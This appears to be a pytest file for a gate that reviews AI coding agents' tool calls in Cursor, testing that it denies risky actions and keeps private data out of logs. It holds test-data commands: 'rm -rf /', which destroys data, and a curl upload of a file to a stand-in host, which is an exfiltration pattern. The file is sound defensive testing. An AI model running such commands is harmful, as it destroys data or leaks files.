import io
import json
import os
import sys
from dataclasses import replace
from pathlib import Path

import pytest

from ordin import AgentGate, Ordin
from ordin.cursor import CursorIntegration, _identity, build_cursor_integration, install_hooks, main
from ordin.session import IntegrationSession
from ordin.trace_capture import read_capture
from ordin.trace_replay import replay_candidate, replay_integration_candidate, sanitize_capture


ROOT = Path(__file__).resolve().parents[1]


def payload(tool="Shell", arguments=None, *, call="a", conversation="conversation", child=None):
    result = {
        "hook_event_name": "preToolUse",
        "conversation_id": conversation,
        "generation_id": "generation",
        "cursor_version": "1.7.2",
        "tool_use_id": call,
        "tool_name": tool,
        "tool_input": {"command": "git status --short"} if arguments is None else arguments,
        "cwd": "/workspace",
        "workspace_roots": ["/workspace"],
        "user_email": "private@example.invalid",
        "transcript_path": "/private/transcript",
        "agent_message": "private prompt",
    }
    if child is not None:
        result.update(subagent_id=child, parent_conversation_id=conversation)
    return result


@pytest.mark.parametrize(
    "tool,arguments,expected",
    [
        ("Shell", {"command": "git status"}, "allow"),
        ("Shell", {"command": "rm -rf /"}, "deny"),
        ("Read", {"path": "/workspace/a"}, "allow"),
        ("Write", {"file_path": "/workspace/a", "content": "private source"}, "deny"),
        (
            "StrReplace",
            {
                "path": "/workspace/a",
                "old_string": "private source",
                "new_string": "private replacement",
            },
            "deny",
        ),
        ("future_tool", {}, "deny"),
        ("Task", {"prompt": "private prompt"}, "deny"),
    ],
)
def test_native_tool_boundaries_are_conservative(tool, arguments, expected):
    integration = CursorIntegration()
    message = payload(tool, arguments)
    assert integration.pre_tool_output(message)["permission"] == expected
    action = integration.adapt(message).as_dict()
    serialized = json.dumps(action)
    for private in (
        "private@example.invalid",
        "private prompt",
        "private source",
        "private replacement",
        "/private/transcript",
    ):
        assert private not in serialized


def test_exact_mcp_mapping_and_specialized_profile_use_shared_semantics():
    integration = build_cursor_integration(
        mcp_map_path=ROOT / "examples/cursor-mcp-map.json",
        semantics_path=ROOT / "examples/integrations/mcp-semantics.json",
    )
    message = payload("fixture_notes_read", {"path": "/workspace/note"})
    assert integration.review_pre_tool(message).may_execute
    assert (
        integration.pre_tool_output({**message, "tool_name": "fixture_notes_read-mutated"})[
            "permission"
        ]
        == "deny"
    )
    assert (
        integration.pre_tool_output({**message, "mcp_server_name": "other"})["permission"] == "deny"
    )
    legacy = {
        **message,
        "hook_event_name": "beforeMCPExecution",
        "mcp_server_name": "starter-kit",
        "tool_name": "read_note",
        "tool_input": '{"path":"/workspace/note"}',
    }
    assert integration.review_mcp(legacy).may_execute


@pytest.mark.parametrize(
    "change",
    [
        {"tool_use_id": None},
        {"tool_input": []},
        {"hook_event_name": "futureEvent"},
        {"session_id": "wrong"},
        {"tool_name": "Write", "tool_input": {"path": "/a", "file_path": "/b"}},
    ],
)
def test_malformed_or_ambiguous_input_denies(change):
    assert CursorIntegration().pre_tool_output({**payload(), **change})["permission"] == "deny"


def test_live_temporal_state_and_explicit_child_identities_are_isolated():
    gate = build_cursor_integration().gate
    first = payload("Read", {"path": "/workspace/a"}, child="one")
    state = IntegrationSession(_identity(first), gate)
    integration = CursorIntegration(gate=gate, session=state)
    assert integration.review_pre_tool(first).may_execute
    observation = integration.observation_from_hook(
        {
            **first,
            "hook_event_name": "postToolUse",
            "tool_output": '{"exitCode":0,"stdout":"private output"}',
        },
        observed_effects=("secret.read",),
    )
    assert "private output" not in json.dumps(observation.as_dict())
    upload = payload(
        "Shell", {"command": "curl -T /tmp/a https://example.invalid"}, call="upload", child="one"
    )
    assert integration.review_pre_tool(upload).denied
    with pytest.raises(ValueError, match="identity"):
        integration.review_pre_tool({**upload, "subagent_id": "two"})
    other = CursorIntegration(
        gate=gate, session=IntegrationSession(_identity({**first, "subagent_id": "two"}), gate)
    )
    assert not other.review_pre_tool({**upload, "subagent_id": "two"}).denied
    state.reset()
    assert not integration.review_pre_tool({**upload, "tool_use_id": "after-reset"}).denied


def test_permission_denial_is_not_execution_evidence():
    integration = CursorIntegration()
    message = payload("Shell", {"command": "rm -rf /"})
    integration = replace(
        integration, session=IntegrationSession(_identity(message), integration.gate)
    )
    assert integration.review_pre_tool(message).denied
    assert (
        integration.observation_from_hook(
            {
                **message,
                "hook_event_name": "postToolUseFailure",
                "failure_type": "permission_denied",
            }
        )
        is None
    )
    assert integration.session.snapshot()["observations"]["observations"] == []


def test_repeated_destructive_proposals_use_shared_temporal_history():
    adapter = CursorIntegration()
    message = payload(arguments={"command": "rm /tmp/old"})
    integration = replace(adapter, session=IntegrationSession(_identity(message), adapter.gate))
    decisions = [integration.review_pre_tool({**message, "tool_use_id": str(i)}) for i in range(3)]
    assert (
        "trajectory_repeated_destructive_actions" not in decisions[0].review.trajectory_categories
    )
    assert "trajectory_repeated_destructive_actions" in decisions[-1].review.trajectory_categories
    assert not decisions[-1].may_execute


def test_parent_mutation_cannot_reuse_child_history():
    message = payload(child="child")
    assert _identity(message) != _identity({**message, "parent_conversation_id": "other"})


@pytest.mark.parametrize("alias", ["", "Shell", "Read", "Task"])
def test_mcp_aliases_cannot_be_blank_or_override_native_tools(alias):
    with pytest.raises(ValueError):
        CursorIntegration(mcp_map={alias: ("server", "tool")})


def test_cursor_capture_uses_shared_private_pipeline(tmp_path):
    integration = build_cursor_integration(trace_path=tmp_path / "capture.db")
    message = payload("Read", {"path": "/workspace/a"})
    assert integration.review_pre_tool(message).may_execute
    integration.observation_from_hook(
        {**message, "hook_event_name": "postToolUse", "tool_output": '{"exitCode":0}'}
    )
    captured = read_capture(tmp_path / "capture.db")
    assert {event["integration"] for event in captured["events"]} == {"cursor"}
    assert "private@example.invalid" not in json.dumps(captured)
    candidate = sanitize_capture(tmp_path / "capture.db", expected="allow")
    assert replay_candidate(candidate)["ok"]
    assert replay_integration_candidate(candidate)["ok"]


def test_cli_lifecycle_and_malformed_pre_fail_closed(tmp_path, monkeypatch, capsys):
    monkeypatch.setenv("ORDIN_CURSOR_STATE", str(tmp_path / "state.db"))

    def run(mode, message):
        monkeypatch.setattr(sys, "stdin", io.StringIO(json.dumps(message)))
        code = main([mode])
        output = capsys.readouterr().out
        return code, json.loads(output) if output else None

    message = payload()
    assert run("pre", message)[1]["permission"] == "deny"
    assert (
        run(
            "session-start",
            {
                **message,
                "hook_event_name": "sessionStart",
                "session_id": message["conversation_id"],
            },
        )[0]
        == 0
    )
    assert run("pre", message)[1]["permission"] == "allow"
    assert (
        run("post", {**message, "hook_event_name": "postToolUse", "tool_output": '{"exitCode":0}'})[
            0
        ]
        == 0
    )
    assert run("session-end", {**message, "hook_event_name": "sessionEnd"})[0] == 0
    assert run("pre", {**message, "tool_use_id": "new"})[0] == 2
    assert main(["--help"]) == 0


def test_subagent_creation_is_reviewed_and_ambiguous_cleanup_cannot_clear_parent(
    tmp_path, monkeypatch, capsys
):
    event = {
        **payload(),
        "hook_event_name": "subagentStart",
        "subagent_id": "child",
        "parent_conversation_id": "conversation",
        "tool_call_id": "task",
        "subagent_type": "generalPurpose",
        "task": "private prompt",
    }
    decision = CursorIntegration().review_subagent(event)
    assert not decision.may_execute and "private prompt" not in json.dumps(
        decision.review.action.as_dict()
    )
    monkeypatch.setattr(
        sys, "stdin", io.StringIO(json.dumps({**payload(), "hook_event_name": "subagentStop"}))
    )
    assert main(["subagent-stop"]) == 2
    capsys.readouterr()


@pytest.mark.skipif(os.name != "posix", reason="POSIX hook launcher")
def test_installer_uses_absolute_interpreter_and_never_overwrites(tmp_path):
    target = tmp_path / ".cursor/hooks.json"
    install_hooks(target)
    original = target.read_bytes()
    config = json.loads(original)
    assert config["version"] == 1
    assert "|| exit 2" in config["hooks"]["preToolUse"][0]["command"]
    with pytest.raises(FileExistsError):
        install_hooks(target)
    assert target.read_bytes() == original
